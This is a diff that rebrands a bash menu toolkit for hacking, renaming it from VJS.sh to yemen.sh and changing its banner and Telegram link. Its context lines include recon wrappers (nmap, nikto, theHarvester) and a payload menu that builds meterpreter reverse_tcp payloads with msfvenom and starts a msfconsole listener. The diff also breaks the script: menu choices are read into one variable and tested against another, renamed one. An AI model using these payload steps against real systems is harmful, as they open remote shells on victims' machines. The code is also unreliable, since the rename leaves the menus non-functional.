@@ -12,17 +12,17 @@ echo -e $green
 echo ""
 echo ""
 echo ""
-echo "                  888     888        888888        .d8888b.  ";
-echo "                  888     888          \"88b       d88P  Y88b ";
-echo "                  888     888           888       Y88b.      ";
-echo "                  Y88b   d88P           888       \"Y888b.   ";
-echo "                   Y88b d88P            888          \"Y88b. ";
-echo "                    Y88o88P             888            \"888 ";
-echo "                     Y888P              88P       Y88b  d88P ";
-echo "                      Y8P               888        \"Y8888P\"  ";
-echo "                                      .d88P                  ";
-echo "                                    .d88P\"                  ";
-echo "                                   888P\"                    ";
+echo "                 tt.        tt.  0000000000.   00000000.         0000000.  00000000000.     ♥♥♥♥♥       ♥♥
+echo "                 tt.        tt.  0000000000.   000000000.      000000000.  000000000000.    ♥ ♥♥♥♥      ♥♥
+echo "                  tt       tt    0000.         000.     00.  00.     000.  0000.            ♥♥    ♥♥     ♥♥
+echo "                    ttttt tt.    000000000.    000.       000.       000.  00000000000.     ♥♥     ♥♥    ♥♥
+echo "                     tttt.       0000.         000.                  000.  0000.            ♥♥      ♥♥   ♥♥
+echo "                     tttt        0000.         000.                  000.  0000.            ♥♥       ♥♥  ♥♥
+echo "                     tttt        0000000000.   000.                  000.  00000000000.     ♥♥        ♥♥ ♥♥
+echo "                     tttt        0000000000    000.                  000.  000000000000.    ♥♥         ♥♥♥♥
+echo "                         
+echo "                                   
+echo "                                              
 echo ""
 echo ""
 echo ""
@@ -122,7 +122,7 @@ echo ""
 echo -e $yellow "Follow us on social networking sites :"
 echo -e $red    "^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
 echo -e $green "<><><><><><><><><><><><><><><><><><><><><><>"
-echo -e $green "<> Telegram: https://t.me/V_J_S_Telegram  <>"
+echo -e $green "<> Telegram: https://t.me/hack_4x.        <>"
 echo -e $green "<> YouTube: http://cutt.us/ySTnl          <>"
 echo -e $green "<> Facebook: http://facebook.com/vjs963   <>"
 echo -e $green "<><><><><><><><><><><><><><><><><><><><><><>"
@@ -154,7 +154,7 @@ echo -e $red "0-"$green" Back"
 echo
 read -p "Enter the Number: " vjs
 
-if [ $vjs = 4 ]
+if [ $yemen = 4 ]
 then
 clear
 echo -e $red "Select the type of tick that you want to encrypt"
@@ -221,17 +221,17 @@ fi
 if [ $hash = 0 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 fi
 ###############################
 
-if [ $vjs = 0 ]
+if [ $yemen = 0 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
-if [ $vjs = 1 ]
+if [ $yemen = 1 ]
 then
 clear
 echo ""
@@ -258,7 +258,7 @@ read -p "Choose the problem number :" Update
 if [ $Update = 8 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $Update = 1 ]
 then
@@ -376,7 +376,7 @@ echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><
 echo ""
 fi
 fi
-if [ $vjs = 2 ]
+if [ $yemen = 2 ]
 then
 clear
 echo -e $red
@@ -400,7 +400,7 @@ read -p "Entre The Number: " name
 if [ $name = 99 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $name = 1 ]
 then
@@ -438,7 +438,7 @@ fi
 if [ $VEGA = 3 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 fi
 if [ $name = 2 ]
@@ -465,7 +465,7 @@ read MALTEGO
 if [ $MALTEGO = 00 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $MALTEGO = 1 ]
 then
@@ -482,7 +482,7 @@ fi
 if [ $MALTEGO = 3 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 fi
 if [ $name = 3 ]
@@ -522,7 +522,7 @@ fi
 if [ $WHATWEB = 3 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 fi
 if [ $name = 4 ]
@@ -570,7 +570,7 @@ fi
 if [ $DMITRY = 4 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 fi
 if [ $name = 5 ]
@@ -608,7 +608,7 @@ fi
 if [ $THEHARVESTER = 3 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 fi
 if [ $name = 6 ]
@@ -646,7 +646,7 @@ fi
 if [ $NIKTO = 3 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 fi
 if [ $name = 7 ]
@@ -684,7 +684,7 @@ fi
 if [ $GOLISMERO = 3 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 fi
 if [ $name = 9 ]
@@ -742,7 +742,7 @@ fi
 if [ $WAPITI = 3 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 fi
 if [ $name = 11 ]
@@ -778,7 +778,7 @@ fi
 if [ $HTTRACK = 3 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 fi
 if [ $name = 8 ]
@@ -816,7 +816,7 @@ fi
 if [ $NMAP = 3 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 fi
 fi
@@ -853,7 +853,7 @@ echo "My public IP address is: $ip"
 echo
 echo -e $blue
 read -p "Preas Any Kay To The Back" enter
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $ipp = 2 ]
 then
@@ -863,7 +863,7 @@ curl http://ip-api.com/$ip
 echo
 echo -e $blue
 read -p "Preas Any Kay To The Back" enter
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $ipp = 3 ]
 then
@@ -873,7 +873,7 @@ curl https://api.hackertarget.com/mtr/?q=$site
 echo
 echo -e $blue
 read -p "Preas Any Kay To The Back" enter
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $ipp = 4 ]
 then
@@ -883,7 +883,7 @@ curl http://api.hackertarget.com/nmap/?q=$port
 echo
 echo -e $blue
 read -p "Preas Any Kay To The Back" enter
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $ipp = 5 ]
 then
@@ -894,7 +894,7 @@ echo "The host is: $s"
 echo
 echo -e $blue
 read -p "Preas Any Kay To The Back" enter
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $ipp = 6 ]
 then
@@ -907,7 +907,7 @@ echo -e $blue
 echo
 echo
 read -p "Preas Any Kay To The Back" enter
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $ipp = 7 ]
 then
@@ -926,7 +926,7 @@ clear
 bash VJS.sh
 fi
 fi
-if [ $vjs = 3 ]
+if [ $yemen = 3 ]
 then
 clear
 echo -e $red
@@ -950,7 +950,7 @@ read -p "Enter the Number: " payload
 if [ $payload = 0 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $payload = 1 ]
 then
@@ -1037,7 +1037,7 @@ echo -e $red "0-"$green" Back"
 echo
 read -p "Enter the Number: " vjs1
 
-if [ $vjs1 = 4 ]
+if [ $yemen1 = 4 ]
 then
 clear
 echo -e $red "Select the type of tick that you want to encrypt"
@@ -1104,18 +1104,18 @@ fi
 if [ $hash = 0 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 fi
 ###############################
 
 
-if [ $vjs1 = 0 ]
+if [ $yemen1 = 0 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
-if [ $vjs1 = 3 ]
+if [ $yemen1 = 3 ]
 then
 clear
 toilet -f pagga "        VJS       "
@@ -1144,12 +1144,12 @@ apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6
 echo
 echo -e $red "                           INSTALLED"
 read -p "ENTER ANY KAY" KAY
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $N = 2 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 fi
 if [ $vjs1 = 2 ]
@@ -1176,7 +1176,7 @@ read -p "Enter the Number: " payload
 if [ $payload = 0 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $payload = 1 ]
 then
@@ -1233,7 +1233,7 @@ msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$host LPORT=$port -o 
 msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit -j'
 fi
 fi
-if [ $vjs1 = 1 ]
+if [ $yemen1 = 1 ]
 then
 clear
 figlet -f slant "INFORMATION" | lolcat
@@ -1265,7 +1265,7 @@ echo "My public IP address is: $ip"
 echo
 echo -e $blue
 read -p "Preas Any Kay To The Back" enter
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $ipp = 2 ]
 then
@@ -1275,7 +1275,7 @@ curl http://ip-api.com/$ip
 echo
 echo -e $blue
 read -p "Preas Any Kay To The Back" enter
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $ipp = 3 ]
 then
@@ -1285,7 +1285,7 @@ curl https://api.hackertarget.com/mtr/?q=$site
 echo
 echo -e $blue
 read -p "Preas Any Kay To The Back" enter
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $ipp = 4 ]
 then
@@ -1295,7 +1295,7 @@ curl http://api.hackertarget.com/nmap/?q=$port
 echo
 echo -e $blue
 read -p "Preas Any Kay To The Back" enter
-bash VJS.sh
+bash yemen.sh
 fi
 
 if [ $ipp = 5 ]
@@ -1331,22 +1331,22 @@ curl https://api.hackertarget.com/pagelinks/?q=$df
 echo
 echo -e $blue
 read -p "Preas Any Kay To The Back" enter
-bash VJS.sh
+bash yemen.sh
 fi
 if [ $ipp = 0 ]
 then
 clear
-bash VJS.sh
+bash yemen.sh
 else
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 else
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 else
 clear
-bash VJS.sh
+bash yemen.sh
 fi
 
